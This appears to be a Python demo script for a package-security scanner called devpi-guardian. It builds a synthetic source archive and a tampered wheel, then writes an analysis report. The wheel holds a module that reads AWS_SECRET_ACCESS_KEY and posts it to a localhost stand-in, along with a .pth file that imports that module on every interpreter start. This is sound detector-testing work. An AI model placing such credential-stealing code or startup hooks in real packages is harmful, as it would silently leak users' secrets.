"""Generate and analyze a fully synthetic devpi-guardian contest demo pair."""

from __future__ import annotations

import argparse
import hashlib
import io
import json
import tarfile
import zipfile
from pathlib import Path

from devpi_guardian.analyzers import (
    compare_sdist_wheel,
    findings_to_report,
    scan_install_surface,
)


def _sha256(path: Path) -> str:
    return hashlib.sha256(path.read_bytes()).hexdigest()


def _write_sdist(path: Path) -> None:
    files = {
        "demo_guardian-1.0.1/PKG-INFO": (
            "Metadata-Version: 2.1\nName: demo-guardian\nVersion: 1.0.1\n"
        ),
        "demo_guardian-1.0.1/demo_guardian/__init__.py": ("__version__ = '1.0.1'\n"),
        "demo_guardian-1.0.1/demo_guardian/core.py": ("def greeting():\n    return 'hello'\n"),
    }
    with tarfile.open(path, "w:gz") as archive:
        for name, content in sorted(files.items()):
            payload = content.encode("utf-8")
            info = tarfile.TarInfo(name)
            info.size = len(payload)
            info.mode = 0o644
            archive.addfile(info, io.BytesIO(payload))


def _write_wheel(path: Path) -> None:
    files = {
        "demo_guardian/__init__.py": "__version__ = '1.0.1'\n",
        "demo_guardian/core.py": "def greeting():\n    return 'hello'\n",
        "demo_guardian/update.py": (
            "import os\n"
            "import requests\n"
            "token = os.getenv('AWS_SECRET_ACCESS_KEY')\n"
            "requests.post('http://127.0.0.1:1/demo', data=token)\n"
        ),
        "demo_guardian_startup.pth": "import demo_guardian.update\n",
        "demo_guardian-1.0.1.dist-info/METADATA": (
            "Metadata-Version: 2.1\nName: demo-guardian\nVersion: 1.0.1\n"
        ),
        "demo_guardian-1.0.1.dist-info/WHEEL": (
            "Wheel-Version: 1.0\nRoot-Is-Purelib: true\nTag: py3-none-any\n"
        ),
    }
    with zipfile.ZipFile(path, "w", compression=zipfile.ZIP_DEFLATED) as archive:
        for name, content in sorted(files.items()):
            archive.writestr(name, content.encode("utf-8"))


def create_demo(output_dir: str | Path) -> tuple[Path, Path, Path]:
    root = Path(output_dir).resolve()
    root.mkdir(parents=True, exist_ok=True)
    sdist = root / "demo_guardian-1.0.1.tar.gz"
    wheel = root / "demo_guardian-1.0.1-py3-none-any.whl"
    report_path = root / "demo-report.json"
    _write_sdist(sdist)
    _write_wheel(wheel)

    f8_findings = scan_install_surface(str(wheel))
    f9_findings = compare_sdist_wheel(str(sdist), str(wheel))
    report = {
        "scenario": "wheel-only credential exfiltration and startup hook",
        "artifacts": {
            "sdist": {"file": sdist.name, "sha256": _sha256(sdist)},
            "wheel": {"file": wheel.name, "sha256": _sha256(wheel)},
        },
        "f8": findings_to_report(
            f8_findings,
            analyzer="F8",
            artifact_sha256=_sha256(wheel),
        ),
        "f9": findings_to_report(
            f9_findings,
            analyzer="F9",
            artifact_sha256=_sha256(wheel),
        ),
    }
    report_path.write_text(
        json.dumps(report, ensure_ascii=False, indent=2, sort_keys=True) + "\n",
        encoding="utf-8",
    )
    return sdist, wheel, report_path


def main() -> int:
    parser = argparse.ArgumentParser(
        description="실행되지 않는 합성 악성 artifact 쌍과 분석 보고서를 만듭니다."
    )
    parser.add_argument("--output-dir", default=".demo")
    arguments = parser.parse_args()
    sdist, wheel, report = create_demo(arguments.output_dir)
    print(f"sdist: {sdist}")
    print(f"wheel: {wheel}")
    print(f"report: {report}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
